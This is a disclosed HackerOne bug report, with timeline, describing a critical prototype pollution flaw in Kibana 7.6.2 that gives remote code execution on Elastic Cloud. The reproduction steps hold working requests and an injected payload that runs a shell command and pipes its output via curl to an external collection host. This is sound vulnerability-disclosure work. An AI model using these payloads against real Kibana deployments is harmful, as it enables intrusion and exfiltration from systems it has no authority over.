---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/privilege-escalation
  - env/cloud
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2020-07-28
submitted: 2020-04-17T22:49:58.303Z
bounty_usd: 10000
votes: 22
cve: []
program: "[[programs/elastic|Elastic]]"
reporter: "alexbrasetvik"
source: "https://hackerone.com/reports/852613"
title: "Remote Code Execution on Cloud via latest Kibana 7.6.2"
---
# Remote Code Execution on Cloud via latest Kibana 7.6.2

> **Severity:** Critical | **Bounty:** 10,000 USD | **Votes:** 22 | **Program:** Elastic | **Disclosed:** 2020-07-28

- Report: [https://hackerone.com/reports/852613](https://hackerone.com/reports/852613)
- CWE: Privilege Escalation
- Submitted: 2020-04-17T22:49:58.303Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** A prototype pollution in Kibana can be used to gain remote code execution.

**Description:**

There is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of `_.set`: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93

We can pollute the prototype by providing a specially crafted "upgrade-assistant-telemetry" "saved object".

The attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :) 

## Steps To Reproduce:

The following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can `DELETE /.kibana*` and restart it to get going again.

  1. Update the kibana mappings so we can provide our "upgrade-assistant-telemetry" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings

```
PUT /.kibana_1/_mappings
{
  "properties": {
    "upgrade-assistant-telemetry": {
      "properties": {
        "constructor": {
          "properties": {
            "prototype": {
              "properties": {
                "sourceURL": {
                  "type": "text",
                  "fields": {
                    "keyword": {
                      "type": "keyword",
                      "ignore_above": 256
                    }
                  }
                }
              }
            }
          }
        },
        "features": {
          "properties": {
            "deprecation_logging": {
              "properties": {
                "enabled": {
                  "type": "boolean",
                  "null_value": true
                }
              }
            }
          }
        },
        "ui_open": {
          "properties": {
            "cluster": {
              "type": "long",
              "null_value": 0
            },
            "indices": {
              "type": "long",
              "null_value": 0
            },
            "overview": {
              "type": "long",
              "null_value": 0
            }
          }
        },
        "ui_reindex": {
          "properties": {
            "close": {
              "type": "long",
              "null_value": 0
            },
            "open": {
              "type": "long",
              "null_value": 0
            },
            "start": {
              "type": "long",
              "null_value": 0
            },
            "stop": {
              "type": "long",
              "null_value": 0
            }
          }
        }
      }
    }
  }
}
```

  2. With the mapping ready, we can index our own telemetry status doc:

```
PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
{
    "upgrade-assistant-telemetry" : {
      "ui_open.overview" : 1,
      "ui_open.cluster" : 1,
      "ui_open.indices" : 1,
      "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')"
    },
    "type" : "upgrade-assistant-telemetry",
    "updated_at" : "2020-04-17T20:47:40.800Z"
  }
```

The payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case `whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-`

  3. Wait until collection happens again, or just restart Kibana. In the video I restart Kibana, which you can do via the cloud console. Go to `https://cloud.elastic.co/deployments/[your id]/kibana` and click "Force Restart".

  4. Kibana will take about a minute to start. Soon after starting, it'll do a telemetry collection run, that'll cause the above code to be injected and that will run the shell code.

Kibana will likely keep starting, run this, crash then restart. I cleaned up my deployment so it's not in a crash-restart loop.

## Impact

Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

## Supporting Material/References:

The attached video recording walks through the entire attack chain.

## Impact

Any cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.

## Timeline

- **Report Filed**
- **2020-04-17** @alexbrasetvik: The account I used has user_id 1710521131 and email "█████". 

The Kibana is https://02fde216d8bd4831b1976b87404aedf9.eu-central-1.aws.cloud.es.io and ES is at https://da78cc790f1b4066adb86c340f7bb014.eu-central-1.aws.cloud.es.io

No other clusters or accounts were involved. I have not run any other shell commands than the provided `whoami | curl …`
- **2020-04-17** @kovyrin: Damn, @alexbrasetvik, you are unstoppable! Seriously impressive find! 💪🏻
- **2020-04-19** @nochnoidozor: Hi @alexbrasetvik,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **2020-04-19** @douglas_day: Hey @alexbrasetvik,

Great find! And thanks for the well put together video PoC. It's useful for troglodytes like myself :)

I have indeed verified this, and I'll be putting this through the necessary steps tomorrow morning. Hang tight until then!
- **Report Triaged**
- **2020-04-20** @alexbrasetvik: Thanks for the quick update :)
- **Bounty Awarded**
- **2020-04-20** @alexbrasetvik: Wow, thanks a lot for the bounty and bonus :)

Happy to retest when you're ready. :)
- **2020-04-20** @anthony_meehan: Well deserved. Find more prototype pollution :)

-Tony
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-07-28** @douglas_day: done :)
